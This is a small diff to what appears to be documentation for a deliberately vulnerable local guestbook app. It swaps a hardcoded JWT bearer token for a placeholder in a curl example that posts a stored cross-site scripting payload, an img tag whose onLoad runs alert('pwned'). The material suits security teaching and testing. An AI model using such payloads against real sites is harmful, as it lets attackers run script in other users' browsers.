@@ -15,7 +15,7 @@ curl -X POST "http://localhost:8080/api/login" \
 ```bash
 # Execute a script when the guestbook page is loaded
 curl -X POST "http://localhost:8080/api/messages" \
-  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpZCI6MTcsImFkbWluIjowLCJpYXQiOjE2OTE4NjgyMTh9.n751IHB0IeGFF2TH6qSsRO9yxLp2vNwSf4PLsrXPi0M" \
+  -H "Authorization: Bearer <token>" \
   -H "Content-Type: application/json" \
   -d "{\"message\": \"<img onLoad=(alert('pwned')) src=\\\"./favicon.ico\\\" />\"}" \
   -v && echo ""
